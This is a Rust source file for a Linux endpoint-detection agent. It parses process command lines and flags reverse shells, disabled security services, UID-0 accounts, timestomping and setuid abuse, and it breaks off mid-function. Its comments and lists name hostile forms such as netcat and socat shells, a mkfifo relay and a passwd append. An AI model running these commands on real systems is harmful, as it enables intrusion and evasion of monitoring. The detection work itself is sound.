//! Linux behaviour rules over process starts: reverse/bind shells beyond the
//! `/dev/tcp` form, disabling of security controls, account manipulation,
//! timestomping, setuid/capability abuse, tunnelling tools, masquerading,
//! disk wiping, container and Kubernetes credential abuse, and command lines
//! of well-known local privilege-escalation exploits.
//!
//! The command line arrives as the space-joined argv, so a `bash -c '…'`
//! script is visible only in the shell's own event while the tools it runs
//! produce their own events as well. Both views are parsed into the same
//! [`SimpleCommand`]s and the findings use the *target* of the action as the
//! subject (the service stopped, the file made setuid, the command run), so
//! the gate's subject key folds the shell's and the tool's finding into one.
//!
//! Precision over recall, as for [`super::windows_rules`]: each rule matches
//! the dangerous *form* of an administration tool (`auditctl -D`, `useradd -o
//! -u 0`, `chmod u+s` on a file in `/tmp`), never the tool itself. Rules whose
//! forms admins use routinely (`ufw disable`, `touch -d`, `chattr -i`) start
//! in shadow or signal mode in the catalog.

use super::ioa::ProcContext;
use trapd_schema::{CorrelationKeys, DetectionData};

const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "fish", "mksh"];
const TEMP_PREFIXES: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"];
/// Directories whose files an attacker modifies to persist or hide.
const SYSTEM_PREFIXES: &[&str] = &[
    "/bin/", "/sbin/", "/usr/", "/lib/", "/lib64/", "/etc/", "/boot/", "/root/",
];
/// Wrappers that run their argument as the real command.
const WRAPPERS: &[&str] = &[
    "sudo", "doas", "env", "nohup", "exec", "command", "timeout", "nice", "ionice", "setsid",
    "stdbuf", "busybox", "time", "strace", "ltrace",
];
/// Network clients a reverse shell relays through.
const NET_CLIENTS: &[&str] = &[
    "nc",
    "ncat",
    "netcat",
    "nc.traditional",
    "nc.openbsd",
    "telnet",
    "openssl",
    "socat",
];

/// One simple command: the tool (basename, lower-case) and its arguments
/// with redirections removed.
#[derive(Debug, Clone, PartialEq, Eq)]
struct SimpleCommand {
    tool: String,
    args: Vec<String>,
}

impl SimpleCommand {
    fn text(&self) -> String {
        std::iter::once(self.tool.as_str())
            .chain(self.args.iter().map(String::as_str))
            .collect::<Vec<_>>()
            .join(" ")
    }

    fn has(&self, flag: &str) -> bool {
        self.args.iter().any(|a| a == flag)
    }

    /// The argument following `flag` (`-u 0`) or glued to it (`-u0`,
    /// `--uid=0`).
    fn value(&self, flags: &[&str]) -> Option<&str> {
        for (i, a) in self.args.iter().enumerate() {
            for f in flags {
                if a == f {
                    return self.args.get(i + 1).map(String::as_str);
                }
                if let Some(v) = a.strip_prefix(f) {
                    let v = v.strip_prefix('=').unwrap_or(v);
                    if !v.is_empty() && (f.starts_with("--") == a.starts_with("--")) {
                        return Some(v);
                    }
                }
            }
        }
        None
    }

    /// Arguments that are not options.
    fn positional(&self) -> impl Iterator<Item = &str> {
        self.args
            .iter()
            .map(String::as_str)
            .filter(|a| !a.starts_with('-'))
    }
}

fn basename(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

/// Split a command line into words and separators, honouring quotes and
/// backslash escapes. Separators are returned as their own words.
fn lex(cmdline: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut chars = cmdline.chars().peekable();
    let flush = |cur: &mut String, out: &mut Vec<String>| {
        if !cur.is_empty() {
            out.push(std::mem::take(cur));
        }
    };
    while let Some(c) = chars.next() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some('"'), '\\') => {
                if let Some(n) = chars.next() {
                    cur.push(n);
                }
            }
            (Some(_), c) => cur.push(c),
            (None, '\'' | '"') => quote = Some(c),
            (None, '\\') => {
                if let Some(n) = chars.next() {
                    cur.push(n);
                }
            }
            (None, c) if c.is_whitespace() && c != '\n' => flush(&mut cur, &mut out),
            (None, ';' | '\n' | '(' | ')' | '`') => {
                flush(&mut cur, &mut out);
                out.push(";".into());
            }
            (None, '|') => {
                flush(&mut cur, &mut out);
                if chars.peek() == Some(&'|') {
                    chars.next();
                    out.push(";".into());
                } else {
                    out.push("|".into());
                }
            }
            (None, '&') => {
                // `2>&1`, `>&2`, `&>file` are redirections, not separators.
                if cur.ends_with('>') || cur.ends_with('<') || chars.peek() == Some(&'>') {
                    cur.push('&');
                    continue;
                }
                flush(&mut cur, &mut out);
                if chars.peek() == Some(&'&') {
                    chars.next();
                }
                out.push(";".into());
            }
            (None, '$') if chars.peek() == Some(&'(') => {
                chars.next();
                flush(&mut cur, &mut out);
                out.push(";".into());
            }
            (None, c) => cur.push(c),
        }
    }
    flush(&mut cur, &mut out);
    out
}

/// Whether a word is a redirection, and whether it consumes the next word
/// (`>`, `2>>`) rather than carrying its target (`>/tmp/f`, `2>&1`).
fn redirection(word: &str) -> Option<bool> {
    let rest = word.trim_start_matches(|c: char| c.is_ascii_digit());
    let rest = rest.strip_prefix('&').unwrap_or(rest);
    if !(rest.starts_with('>') || rest.starts_with('<')) {
        return None;
    }
    let target = rest.trim_start_matches(['>', '<', '|']);
    Some(target.is_empty())
}

/// A word list into a [`SimpleCommand`]: strip assignments, wrappers and
/// redirections, and unwrap `sh -c <script>` into the script's first command.
fn simple_command(lexed: &[String]) -> Option<SimpleCommand> {
    let mut words: Vec<&str> = Vec::with_capacity(lexed.len());
    let mut skip_next = false;
    for w in lexed.iter().map(String::as_str) {
        if skip_next {
            skip_next = false;
            continue;
        }
        match redirection(w) {
            Some(consumes) => skip_next = consumes,
            None => words.push(w),
        }
    }
    let mut i = 0;
    loop {
        while i < words.len() && is_assignment(words[i]) {
            i += 1;
        }
        let tool = basename(words.get(i)?).to_ascii_lowercase();
        if WRAPPERS.contains(&tool.as_str()) {
            i += 1;
            // Wrapper options, and the values of the ones that take one.
            while i < words.len() && (words[i].starts_with('-') || is_assignment(words[i])) {
                let takes_value = matches!(
                    (tool.as_str(), words[i]),
                    ("sudo" | "doas", "-u" | "-g" | "-C" | "-p" | "-r" | "-t")
                        | ("nice", "-n")
                        | ("ionice", "-c" | "-n")
                        | ("timeout", "-s" | "-k")
                        | ("strace" | "ltrace", "-o" | "-e" | "-p")
                );
                i += if takes_value { 2 } else { 1 };
            }
            // `timeout 10 cmd`: the duration.
            if tool == "timeout"
                && words
                    .get(i)
                    .is_some_and(|w| w.chars().next().is_some_and(|c| c.is_ascii_digit()))
            {
                i += 1;
            }
            continue;
        }
        if SHELLS.contains(&tool.as_str()) {
            // `bash -c script`, `sh -lc script`: the script is the command.
            let c_flag = words[i + 1..].iter().position(|w| {
                w.len() >= 2
                    && w.starts_with('-')
                    && !w.starts_with("--")
                    && w.ends_with('c')
                    && w[1..].chars().all(|c| c.is_ascii_alphabetic())
            });
            if let Some(p) = c_flag {
                i += 1 + p + 1;
                if i >= words.len() {
                    return Some(SimpleCommand {
                        tool,
                        args: Vec::new(),
                    });
                }
                continue;
            }
        }
        return Some(SimpleCommand {
            tool,
            args: words[i + 1..].iter().map(|s| s.to_string()).collect(),
        });
    }
}

fn is_assignment(w: &str) -> bool {
    w.split_once('=').is_some_and(|(k, _)| {
        !k.is_empty()
            && !k.starts_with('-')
            && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

/// The command line as pipelines of simple commands. A shell's `-c` script is
/// lexed again, so a script passed as one argv element (quotes already gone)
/// is split the same way as one typed at a prompt.
fn pipelines(cmdline: &str) -> Vec<Vec<SimpleCommand>> {
    let mut out = Vec::new();
    let mut pipeline = Vec::new();
    let mut words: Vec<String> = Vec::new();
    let close = |words: &mut Vec<String>, pipeline: &mut Vec<SimpleCommand>| {
        if let Some(c) = simple_command(words) {
            pipeline.push(c);
        }
        words.clear();
    };
    for w in lex(cmdline) {
        match w.as_str() {
            "|" => close(&mut words, &mut pipeline),
            ";" => {
                close(&mut words, &mut pipeline);
                if !pipeline.is_empty() {
                    out.push(std::mem::take(&mut pipeline));
                }
            }
            _ => words.push(w),
        }
    }
    close(&mut words, &mut pipeline);
    if !pipeline.is_empty() {
        out.push(pipeline);
    }
    out
}

#[allow(clippy::too_many_arguments)]
fn finding(
    rule_id: &str,
    title: &str,
    category: &str,
    tactic: &str,
    technique: &str,
    confidence: u8,
    subject: &str,
    cmdline: &str,
    extra: serde_json::Value,
) -> DetectionData {
    let mut evidence = serde_json::json!({ "cmdline": cmdline });
    if let (Some(e), serde_json::Value::Object(x)) = (evidence.as_object_mut(), extra) {
        e.extend(x);
    }
    DetectionData {
        rule_id: rule_id.into(),
        title: title.into(),
        category: category.into(),
        mitre_tactic: Some(tactic.into()),
        mitre_technique: Some(technique.into()),
        confidence,
        subject: subject.to_string(),
        detail: format!("{title}: {cmdline}"),
        evidence,
        ..Default::default()
    }
}

fn with_path(mut d: DetectionData, path: &str) -> DetectionData {
    d.correlation = Some(CorrelationKeys {
        file_path: Some(path.to_string()),
        ..Default::default()
    });
    d
}

const C2: &str = "TA0011 Command and Control";
const PERSIST: &str = "TA0003 Persistence";
const PRIVESC: &str = "TA0004 Privilege Escalation";
const EVASION: &str = "TA0005 Defense Evasion";
const CREDS: &str = "TA0006 Credential Access";
const IMPACT: &str = "TA0040 Impact";

/// Linux rules over one process start. Each finding is a distinct
/// observation; the gate folds repeats.
pub fn inspect_process(
    comm: &str,
    exe: &str,
    cmdline: &str,
    ctx: Option<&ProcContext>,
) -> Vec<DetectionData> {
    let mut out = Vec::new();
    // Windows images are judged by `windows_rules`.
    if exe.contains('\\') || exe.to_ascii_lowercase().ends_with(".exe") {
        return out;
    }
    // The agent's own children (quarantine `chattr`, `systemctl restart`)
    // are the response, not an attack.
    if ctx.is_some_and(|c| c.ancestor_comms.iter().take(4).any(|a| a == "trapd-agent")) {
        return out;
    }
    let pipelines = pipelines(cmdline);
    for pipeline in &pipelines {
        for cmd in pipeline {
            inspect_command(cmd, cmdline, ctx, &mut out);
        }
        if let Some(d) = pipe_relay(pipeline, cmdline) {
            out.push(d);
        }
    }
    if let Some(d) = fifo_relay(&pipelines, cmdline) {
        out.push(d);
    }
    if let Some(d) = exploit_command(&pipelines, cmdline) {
        out.push(d);
    }
    inspect_image(comm, exe, cmdline, &mut out);
    // One finding per rule and subject for this event.
    let mut seen = std::collections::HashSet::new();
    out.retain(|d| seen.insert((d.rule_id.clone(), d.subject.clone())));
    out
}

fn inspect_command(
    cmd: &SimpleCommand,
    cmdline: &str,
    ctx: Option<&ProcContext>,
    out: &mut Vec<DetectionData>,
) {
    let tool = cmd.tool.as_str();
    let text = cmd.text();
    match tool {
        "nc" | "ncat" | "netcat" | "nc.traditional" | "nc.openbsd" => {
            if let Some(d) = netcat_exec(cmd, &text, cmdline) {
                out.push(d);
            }
        }
        "socat" => {
            if let Some(d) = socat_exec(cmd, &text, cmdline) {
                out.push(d);
            }
        }
        "systemctl" | "service" | "rc-service" | "invoke-rc.d" | "chkconfig" | "update-rc.d"
        | "sv" => {
            out.extend(service_stop(cmd, cmdline));
        }
        "pkill" | "killall" | "kill" => out.extend(daemon_kill(cmd, cmdline)),
        "setenforce"
            if cmd
                .positional()
                .any(|a| a == "0" || a.eq_ignore_ascii_case("permissive")) =>
        {
            out.push(security_off(
                "selinux",
                "SELinux set to permissive",
                cmdline,
            ));
        }
        "aa-teardown" => out.push(security_off(
            "apparmor",
            "AppArmor profiles unloaded",
            cmdline,
        )),
        "aa-disable" | "aa-complain" => out.push(security_off(
            "apparmor",
            "AppArmor profile disabled",
            cmdline,
        )),
        "auditctl" => {
            let disables = cmd.has("-D")
                || cmd.value(&["-e"]) == Some("0")
                || cmd.args.windows(2).any(|w| w[0] == "-e" && w[1] == "0");
            if disables {
                out.push(finding(
                    "evasion.audit_rules_cleared",
                    "Kernel audit rules deleted or auditing disabled",
                    "defense_evasion",
                    EVASION,
                    "T1562.012",
                    90,
                    "auditd",
                    cmdline,
                    serde_json::json!({ "command": text }),
                ));
            }
        }
        "ufw" if cmd.positional().next() == Some("disable") => {
            out.push(firewall_off("ufw", cmdline));
        }
        "iptables" | "ip6tables" | "iptables-legacy" | "iptables-nft" => {
            let flush = cmd.has("-F") || cmd.has("--flush");
            let accept_all = cmd
                .args
                .windows(3)
                .any(|w| w[0] == "-P" && w[1].eq_ignore_ascii_case("INPUT") && w[2] == "ACCEPT");
            if flush || accept_all {
                out.push(firewall_off(tool, cmdline));
            }
        }
        "nft" if text.contains("flush ruleset") => out.push(firewall_off("nftables", cmdline)),
        "useradd" | "adduser" | "luseradd" => out.extend(account_add(cmd, cmdline)),
        "usermod" => out.extend(account_modify(cmd, cmdline)),
        "gpasswd" => {
            // `gpasswd -a user sudo`
            if let Some(user) = cmd.value(&["-a", "--add"]) {
                if let Some(group) = cmd.positional().filter(|a| *a != user).last() {
                    if ADMIN_GROUPS.contains(&group) {
                        out.push(admin_group(user, group, cmdline));
                    }
                }
            }
        }
        "touch" => {
            if let Some(d) = timestomp(cmd, cmdline) {
                out.push(d);
            }
        }
        "chmod" => {
            if let Some(d) = setuid_bit(cmd, cmdline) {
                out.push(d);
            }
        }
        "setcap" => {
            if let Some(d) = capability_set(cmd, cmdline) {
                out.push(d);
            }
        }
        "chattr" => {
            if let Some(d) = chattr_tamper(cmd, cmdline) {
                out.push(d);
            }
        }
        "chisel" | "ngrok" | "frpc" | "frps" | "gost" | "ligolo" | "ligolo-ng" | "iox"
        | "rathole" | "bore" | "revsocks" | "rsocx" | "pwncat" | "pwncat-cs" => {
            out.push(finding(
                "c2.tunnel_tool",
                "Tunnelling or proxy tool executed",
                "command_and_control",
                C2,
                "T1572",
                75,
                &text,
                cmdline,
                serde_json::json!({ "tool": tool }),
            ));
        }
        "ssh" => {
            if let Some(d) = ssh_tunnel(cmd, &text, cmdline) {
                out.push(d);
            }
        }
        "tcpdump" | "tshark" | "dumpcap" | "ngrep" => {
            // Reading a capture file is analysis, not capture.
            let reads_file = cmd.has("-r") || cmd.args.iter().any(|a| a.starts_with("-r"));
            if !reads_file {
                out.push(finding(
                    "creds.network_sniffing",
                    "Network traffic capture started",
                    "credential_access",
                    CREDS,
                    "T1040",
                    40,
                    tool,
                    cmdline,
                    serde_json::json!({ "tool": tool }),
                ));
            }
        }
        "ettercap" | "bettercap" | "arpspoof" | "dsniff" | "responder" | "responder.py"
        | "mitm6" | "sslstrip" | "dnschef" => {
            out.push(finding(
                "creds.mitm_tool",
                "Adversary-in-the-middle tool executed",
                "credential_access",
                CREDS,
                "T1557",
                85,
                tool,
                cmdline,
                serde_json::json!({ "tool": tool }),
            ));
        }
        "dd" | "shred" | "wipefs" | "blkdiscard" | "rm" => {
            if let Some(d) = disk_wipe(cmd, cmdline) {
                out.push(d);
            }
        }
        "docker" | "podman" | "nerdctl" => {
            if let Some(d) = privileged_container(cmd, &text, cmdline) {
                out.push(d);
            }
        }
        _ => {}
    }
    if let Some(d) = secret_file_read(cmd, &text, cmdline, ctx) {
        out.push(d);
    }
    if let Some(d) = passwd_uid0_write(cmd, cmdline) {
        out.push(d);
    }
}

// ── Reverse and bind shells ─────────────────────────────────────────────────

/// `nc -e /bin/sh host port`, `ncat --exec`, `--sh-exec`, `-c 'sh'`.
fn netcat_exec(cmd: &SimpleCommand, text: &str, cmdline: &str) -> Option<DetectionData> {
    let mut program = None;
    for (i, a) in cmd.args.iter().enumerate() {
        let next = cmd.args.get(i + 1).map(String::as_str);
        if matches!(a.as_str(), "--exec" | "--sh-exec" | "--lua-exec") {
            program = next;
        } else if let Some(v) = a
            .strip_prefix("--exec=")
            .or_else(|| a.strip_prefix("--sh-exec="))
        {
            program = Some(v);
        } else if a.starts_with('-') && !a.starts_with("--") {
            // A short-option cluster ending in `e` (`-e`, `-nve`) takes the
            // program; `-c` does the same in traditional and nmap netcat but
            // means "TLS" in LibreSSL's, so only a shell argument counts.
            let flags = &a[1..];
            let cluster = flags.chars().all(|c| c.is_ascii_alphabetic());
            let shell_arg =
                next.is_some_and(|n| SHELLS.contains(&basename(n.split(' ').next().unwrap_or(n))));
            if cluster && (flags.ends_with('e') || (flags.ends_with('c') && shell_arg)) {
                program = next;
            } else if let Some(p) = flags.strip_prefix('e').filter(|p| p.starts_with('/')) {
                program = Some(p);
            }
        }
        if program.is_some() {
            break;
        }
    }
    let program = program?;
    let listener = cmd.args.iter().any(|a| {
        a == "--listen" || (a.starts_with('-') && !a.starts_with("--") && a.contains('l'))
    });
    Some(finding(
        "revshell.netcat_exec",
        if listener {
            "Bind shell: netcat listener executes a program"
        } else {
            "Reverse shell: netcat connects a program to the network"
        },
        "reverse_shell",
        C2,
        "T1059.004",
        90,
        text,
        cmdline,
        serde_json::json!({ "program": program, "listener": listener }),
    ))
}

/// `socat tcp:host:port exec:/bin/sh,pty` (and the listener form).
fn socat_exec(cmd: &SimpleCommand, text: &str, cmdline: &str) -> Option<DetectionData> {
    let addresses: Vec<String> = cmd.positional().map(|a| a.to_ascii_lowercase()).collect();
    let program = addresses
        .iter()
        .find(|a| a.starts_with("exec:") || a.starts_with("system:"))?;
    let network = addresses.iter().any(|a| {
        ["tcp", "udp", "ssl", "openssl", "sctp"]
            .iter()
            .any(|p| a.starts_with(p))
    });
    network.then(|| {
        finding(
            "revshell.socat_exec",
            "socat connects a program to the network",
            "reverse_shell",
            C2,
            "T1059.004",
            85,
            text,
            cmdline,
            serde_json::json!({ "program": program }),
        )
    })
}

/// A shell whose output is piped into a network client (`cat f | sh -i |
/// nc host port > f`, `telnet a 1 | sh | telnet a 2`, the openssl variant).
/// The order is the point: `curl x | sh` is a download, `sh | nc` a relay.
fn pipe_relay(pipeline: &[SimpleCommand], cmdline: &str) -> Option<DetectionData> {
    let shell = pipeline
        .iter()
        .position(|c| SHELLS.contains(&c.tool.as_str()))?;
    let client = pipeline[shell + 1..].iter().find(|c| is_net_client(c))?;
    let text = pipeline
        .iter()
        .map(SimpleCommand::text)
        .collect::<Vec<_>>()
        .join(" | ");
    Some(finding(
        "revshell.pipe_relay",
        "Reverse shell: shell output piped to a network client",
        "reverse_shell",
        C2,
        "T1059.004",
        90,
        &text,
        cmdline,
        serde_json::json!({ "client": client.tool }),
    ))
}

/// `mkfifo /tmp/f; nc host port < /tmp/f | sh > /tmp/f`: a named pipe closes
/// the loop between a network client and a shell in either order.
fn fifo_relay(pipelines: &[Vec<SimpleCommand>], cmdline: &str) -> Option<DetectionData> {
    let fifo = pipelines
        .iter()
        .flatten()
        .any(|c| c.tool == "mkfifo" || (c.tool == "mknod" && c.args.iter().any(|a| a == "p")));
    if !fifo {
        return None;
    }
    let relay = pipelines.iter().find(|p| {
        p.iter().any(|c| SHELLS.contains(&c.tool.as_str())) && p.iter().any(is_net_client)
    })?;
    // The ordered form is already `revshell.pipe_relay`.
    if pipe_relay(relay, cmdline).is_some() {
        return None;
    }
    let text = relay
        .iter()
        .map(SimpleCommand::text)
        .collect::<Vec<_>>()
        .join(" | ");
    Some(finding(
        "revshell.pipe_relay",
        "Reverse shell: named pipe relays a shell over the network",
        "reverse_shell",
        C2,
        "T1059.004",
        90,
        &text,
        cmdline,
        serde_json::json!({ "fifo": true }),
    ))
}

fn is_net_client(c: &SimpleCommand) -> bool {
    NET_CLIENTS.contains(&c.tool.as_str())
        && (c.tool != "openssl" || c.args.first().is_some_and(|a| a == "s_client"))
        // `nc -l` without a peer is a listener; still a relay when paired.
        && (c.tool != "socat" || c.args.iter().any(|a| a.to_ascii_lowercase().starts_with("tcp")))
}

// ── Disabling security controls ─────────────────────────────────────────────

/// Services whose stop removes detection or audit capability.
const SECURITY_SERVICES: &[&str] = &[
    "auditd",
    "apparmor",
    "falco",
    "falcon-sensor",
    "osqueryd",
    "wazuh-agent",
    "ossec",
    "ossec-hids",
    "clamav-daemon",
    "clamav-freshclam",
    "clamd",
    "sentinelone",
    "sentinel-agent",
    "cbagentd",
    "mdatp",
    "auditbeat",
    "elastic-agent",
    "elastic-endpoint",
    "sysmon",
    "trapd-agent",
    "trapd-agent-update",
    "aide",
    "fail2ban",
    "rsyslog",
    "rsyslogd",
    "syslog-ng",
    "systemd-journald",
];
const FIREWALL_SERVICES: &[&str] = &["firewalld", "ufw", "nftables", "iptables", "ip6tables"];

fn service_name(arg: &str) -> &str {
    let b = basename(arg);
    b.strip_suffix(".service")
        .or_else(|| b.strip_suffix(".socket"))
        .unwrap_or(b)
}

/// The signal a `kill`-style command sends, when it names one: `-HUP`,
/// `-9`, `-s HUP`, `--signal=HUP`, `-SIGUSR1`.
fn signal_of(cmd: &SimpleCommand) -> Option<String> {
    for (i, a) in cmd.args.iter().enumerate() {
        if a == "-s" || a == "--signal" {
            return cmd.args.get(i + 1).cloned();
        }
        if let Some(v) = a.strip_prefix("--signal=") {
            return Some(v.to_string());
        }
        if let Some(v) = a.strip_prefix('-').filter(|v| !v.starts_with('-')) {
            if v.chars()
                .next()
                .is_some_and(|c| c.is_ascii_digit() || c.is_ascii_uppercase())
            {
                return Some(v.to_string());
            }
        }
    }
    None
}

/// Whether a signal ends the process. Reload and rotation signals
/// (`systemctl kill -s HUP rsyslog` in logrotate) do not.
fn terminates(cmd: &SimpleCommand) -> bool {
    let Some(sig) = signal_of(cmd) else {
        return true; // SIGTERM by default
    };
    let sig = sig.to_ascii_uppercase();
    let sig = sig.strip_prefix("SIG").unwrap_or(&sig);
    matches!(
        sig,
        "KILL"
            | "TERM"
            | "STOP"
            | "INT"
            | "QUIT"
            | "ABRT"
            | "SEGV"
            | "9"
            | "15"
            | "19"
            | "2"
            | "3"
            | "6"
            | "11"
    )
}

/// `systemctl stop|disable|mask|kill auditd`, `service auditd stop`.
fn service_stop(cmd: &SimpleCommand, cmdline: &str) -> Vec<DetectionData> {
    const STOPS: &[&str] = &["stop", "disable", "mask", "kill", "off"];
    if cmd.tool == "systemctl" && cmd.positional().next() == Some("kill") && !terminates(cmd) {
        return Vec::new();
    }
    // `systemctl kill -s HUP x`: the signal name is not a unit.
    let signal = signal_of(cmd);
    let pos: Vec<&str> = cmd
        .positional()
        .filter(|a| signal.as_deref() != Some(*a))
        .collect();
    let services: Vec<&str> = match cmd.tool.as_str() {
        // systemctl <verb> <unit…>
        "systemctl" => match pos.split_first() {
            Some((verb, units)) if STOPS.contains(verb) => units.to_vec(),
            _ => Vec::new(),
        },
        // service <name> stop · rc-service <name> stop · sv down <name>
        "service" | "rc-service" | "invoke-rc.d" => match pos.as_slice() {
            [name, verb, ..] if STOPS.contains(verb) => vec![*name],
            _ => Vec::new(),
        },
        "sv" => match pos.as_slice() {
            [verb, names @ ..] if matches!(*verb, "down" | "stop" | "force-stop") => names.to_vec(),
            _ => Vec::new(),
        },
        // chkconfig <name> off · update-rc.d <name> disable|remove
        "chkconfig" | "update-rc.d" => match pos.as_slice() {
            [name, verb, ..] if matches!(*verb, "off" | "disable" | "remove") => vec![*name],
            _ => Vec::new(),
        },
        _ => Vec::new(),
    };
    let mut out = Vec::new();
    for s in services.into_iter().map(service_name) {
        if SECURITY_SERVICES.contains(&s) {
            out.push(security_off(
                s,
                "Security service stopped or disabled",
                cmdline,
            ));
        } else if FIREWALL_SERVICES.contains(&s) {
            out.push(firewall_off(s, cmdline));
        }
    }
    out
}

/// `pkill auditd`, `killall -9 falco`. `kill <pid>` names no process.
fn daemon_kill(cmd: &SimpleCommand, cmdline: &str) -> Vec<DetectionData> {
    if cmd.tool == "kill" || !terminates(cmd) {
        return Vec::new();
    }
    let signal = signal_of(cmd);
    cmd.positional()
        .filter(|a| signal.as_deref() != Some(*a))
        .map(service_name)
        .filter(|s| SECURITY_SERVICES.contains(s))
        .map(|s| security_off(s, "Security service process killed", cmdline))
        .collect()
}

fn security_off(service: &str, title: &str, cmdline: &str) -> DetectionData {
    finding(
        "evasion.security_service_stopped",
        title,
        "defense_evasion",
        EVASION,
        "T1562.001",
        80,
        service,
        cmdline,
        serde_json::json!({ "service": service }),
    )
}

fn firewall_off(firewall: &str, cmdline: &str) -> DetectionData {
    finding(
        "evasion.firewall_disabled",
        "Host firewall disabled or flushed",
        "defense_evasion",
        EVASION,
        "T1562.004",
        60,
        firewall,
        cmdline,
        serde_json::json!({ "firewall": firewall }),
    )
}

// ── Accounts ────────────────────────────────────────────────────────────────

/// Groups whose membership is root-equivalent.
const ADMIN_GROUPS: &[&str] = &["sudo", "wheel", "root", "admin", "docker", "lxd", "disk"];

fn uid_zero(cmd: &SimpleCommand) -> bool {
    cmd.value(&["-u", "--uid"]) == Some("0")
}

fn account_add(cmd: &SimpleCommand, cmdline: &str) -> Vec<DetectionData> {
    let user = cmd.positional().last().unwrap_or("").to_string();
    // `useradd -u 0 -o` = a second root account.
    if uid_zero(cmd) {
        return vec![uid0_account(&user, cmdline)];
    }
    let mut out = vec![finding(
        "persistence.account_created",
        "Local account created",
        "persistence",
        PERSIST,
        "T1136.001",
        40,
        &user,
        cmdline,
        serde_json::json!({ "account": user }),
    )];
    for g in groups_of(cmd) {
        if ADMIN_GROUPS.contains(&g.as_str()) {
            out.push(admin_group(&user, &g, cmdline));
        }
    }
    out
}

fn account_modify(cmd: &SimpleCommand, cmdline: &str) -> Vec<DetectionData> {
    let user = cmd.positional().last().unwrap_or("").to_string();
    if uid_zero(cmd) {
        return vec![uid0_account(&user, cmdline)];
    }
    groups_of(cmd)
        .into_iter()
        .filter(|g| ADMIN_GROUPS.contains(&g.as_str()))
        .map(|g| admin_group(&user, &g, cmdline))
        .collect()
}

/// `-G a,b`, `-aG a`, `--groups a`, `-g root` (primary group).
fn groups_of(cmd: &SimpleCommand) -> Vec<String> {
    let mut out = Vec::new();
    for (i, a) in cmd.args.iter().enumerate() {
        let short = a.starts_with('-') && !a.starts_with("--");
        let value = if a == "--groups" || a == "--gid" || (short && (a.ends_with('G') || a == "-g"))
        {
            cmd.args.get(i + 1).cloned()
        } else {
            a.strip_prefix("--groups=").map(String::from)
        };
        if let Some(v) = value {
            out.extend(v.split(',').map(|g| g.trim().to_string()));
        }
    }
    out
}

fn uid0_account(user: &str, cmdline: &str) -> DetectionData {
    finding(
        "privesc.uid0_account",
        "Account with UID 0 created",
        "privilege_escalation",
        PRIVESC,
        "T1136.001",
        90,
        user,
        cmdline,
        serde_json::json!({ "account": user }),
    )
}

fn admin_group(user: &str, group: &str, cmdline: &str) -> DetectionData {
    finding(
        "privesc.admin_group_added",
        "Account added to a root-equivalent group",
        "privilege_escalation",
        PRIVESC,
        "T1098",
        65,
        &format!("{user}:{group}"),
        cmdline,
        serde_json::json!({ "account": user, "group": group }),
    )
}

/// `echo 'x:x:0:0::/root:/bin/bash' >> /etc/passwd`: a UID-0 line appended
/// to the password file by anything but the account tools.
fn passwd_uid0_write(cmd: &SimpleCommand, cmdline: &str) -> Option<DetectionData> {
    if !matches!(cmd.tool.as_str(), "echo" | "printf" | "tee" | "cat") {
        return None;
    }
    let targets = super::behavior::write_targets(&cmd.tool, cmdline);
    if !targets.iter().any(|t| t == "/etc/passwd") {
        return None;
    }
    let user = cmd
        .args
        .iter()
        .flat_map(|a| a.split_whitespace())
        .find_map(|a| {
            let f: Vec<&str> = a.split(':').collect();
            (f.len() >= 7 && f[2] == "0" && !f[0].is_empty() && f[0] != "root")
                .then(|| f[0].to_string())
        })?;
    Some(with_path(uid0_account(&user, cmdline), "/etc/passwd"))
}

// ── File attribute abuse ────────────────────────────────────────────────────

fn system_or_temp(path: &str) -> bool {
    SYSTEM_PREFIXES.iter().any(|p| path.starts_with(p))
        || TEMP_PREFIXES.iter().any(|p| path.starts_with(p))
        || path.ends_with("authorized_keys")
}

/// `touch -r ref target`, `touch -d '2019-01-01' target` on a system path.
fn timestomp(cmd: &SimpleCommand, cmdline: &str) -> Option<DetectionData> {
    let sets_time = cmd.args.iter().any(|a| {
        matches!(a.as_str(), "-r" | "-d" | "-t" | "--reference" | "--date")
            || a.starts_with("--reference=")
            || a.starts_with("--date=")
            || (a.starts_with('-')
                && !a.starts_with("--")
                && a.len() > 2
                && a[1..].chars().all(|c| c.is_ascii_alphabetic())
                && a.contains(['r', 'd', 't']))
    });
    if !sets_time {
        return None;
    }
    // Drop the option values (the reference file or the date).
    let mut targets = Vec::new();
    let mut skip = false;
    for a in &cmd.args {
        if skip {
            skip = false;
            continue;
        }
        if matches!(a.as_str(), "-r" | "-d" | "-t" | "--reference" | "--date")
            || (a.starts_with('-') && !a.starts_with("--") && a.ends_with(['r', 'd', 't']))
        {
            skip = true;
            continue;
        }
        if !a.starts_with('-') {
            targets.push(a.as_str());
        }
    }
    let target = targets
        .into_iter()
        .find(|t| SYSTEM_PREFIXES.iter().any(|p| t.starts_with(p)))?;
    Some(with_path(
        finding(
            "evasion.timestomp",
            "File timestamps forged on a system file",
            "defense_evasion",
            EVASION,
            "T1070.006",
            60,
            target,
            cmdline,
            serde_json::json!({ "path": target }),
        ),
        target,
    ))
}

/// `chmod u+s f`, `chmod 4755 f`, `chmod +s f` (setuid, not setgid-only).
fn setuid_bit(cmd: &SimpleCommand, cmdline: &str) -> Option<DetectionData> {
    let mut pos = cmd.positional();
    let mode = pos.next()?;
    let setuid = if mode.chars().all(|c| c.is_ascii_digit()) {
        // Octal: the setuid bit is 4 in the leading special digit.
        mode.len() == 4 && mode.as_bytes()[0].wrapping_sub(b'0') & 4 != 0
    } else {
        mode.split(',').any(|clause| {
            let (who, rest) = clause.split_at(clause.find(['+', '=']).unwrap_or(clause.len()));
            rest.starts_with(['+', '='])
                && rest.contains('s')
                && (who.is_empty() || who.contains('u') || who.contains('a'))
        })
    };
    if !setuid {
        return None;
    }
    let target = pos.next()?;
    let temp = TEMP_PREFIXES.iter().any(|p| target.starts_with(p))
        || target.starts_with("/home/")
        || basename(target).starts_with('.');
    let interpreter = matches!(
        basename(target),
        "bash" | "sh" | "dash" | "zsh" | "python" | "python3" | "perl" | "find" | "vim" | "env"
    );
    Some(with_path(
        finding(
            "privesc.setuid_bit_set",
            "Setuid bit set on a file",
            "privilege_escalation",
            PRIVESC,
